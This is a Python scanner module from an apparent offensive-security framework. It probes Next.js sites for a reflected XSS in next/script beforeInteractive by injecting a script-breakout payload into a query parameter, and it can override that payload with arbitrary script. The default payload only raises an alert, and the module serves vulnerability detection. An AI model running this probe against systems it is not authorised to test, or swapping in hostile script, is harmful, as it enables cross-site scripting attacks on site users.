#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_DEFAULT_FRAGMENT = '</script><script>window.__pwn=true;alert("VALIDATION_TOKEN")</script><x x="'
_PUSH = "(self.__next_s=self.__next_s||[]).push("
_NEEDLE = "</script><script>"
_ESCAPED = "\\u003c/script\\u003e\\u003cscript\\u003e"


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js next/script beforeInteractive XSS (GHSA-gx5p) — detect",
        "description": (
            "GET with reflected PoC query param; positive if `</script><script>` appears after "
            "`__next_s` push block. Standalone scanner."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "references": ["https://github.com/advisories/GHSA-gx5p-jg67-6x7h"],
        "tags": ["scanner", "http", "nextjs", "xss"],
    }

    inject_param = OptString("tid", "Query parameter for encoded payload", required=False)
    xss_payload_override = OptString("", "Override raw payload (empty = PoC)", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _probe_url(self) -> str:
        frag = str(self._o(self.xss_payload_override) or "").strip() or _DEFAULT_FRAGMENT
        enc = quote(frag, safe="")
        base = self._url()
        sep = "&" if "?" in base else "?"
        name = str(self._o(self.inject_param) or "tid").strip() or "tid"
        return f"{base}{sep}{name}={enc}"

    @staticmethod
    def _classify(body: str) -> str:
        if not body:
            return "empty"
        push_idx = body.find(_PUSH)
        tail = body[push_idx:] if push_idx != -1 else body
        if _NEEDLE in tail:
            return "vulnerable"
        if _ESCAPED in body:
            return "patched"
        return "inconclusive"

    def run(self):
        try:
            r = self.get(self._probe_url(), timeout=float(self._o(self.timeout)))
        except Exception as e:
            self.set_info(reason=str(e))
            return False
        if r.status_code != 200:
            self.set_info(reason=f"HTTP {r.status_code}")
            return False
        v = self._classify(r.text)
        if v == "vulnerable":
            self.set_info(reason="__next_s context breakout", confidence="high")
            return True
        if v == "patched":
            self.set_info(reason="escaped (patched)", confidence="high")
            return False
        self.set_info(reason="inconclusive", confidence="low")
        return False
